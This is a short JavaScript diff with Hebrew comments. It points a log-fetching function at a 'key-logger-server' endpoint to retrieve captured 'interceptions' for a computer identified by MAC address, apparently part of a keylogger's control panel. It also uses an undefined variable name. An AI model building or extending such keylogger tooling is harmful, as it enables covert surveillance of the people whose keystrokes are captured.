@@ -205,10 +205,15 @@
     // זו הפונקציה שמביאה את הלוגים מהשרת
     async function fetchLogs(mac) {
       // כאן נתיב דמיוני שמחזיר את הפורמט שרשמת בשאלה
-      const url = `https://your-server.com/logs?mac=${mac}`;
+      const url = `https://key-logger-server.onrender.com/api/data/files`;
 
       try {
-        const response = await fetch(url);
+        const response = await fetch(url, {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json',
+            'mac_address' : macAddress
+          }});
         if (!response.ok) {
           throw new Error('שגיאה בטעינת ההאזנות מהמחשב המבוקש');
         }
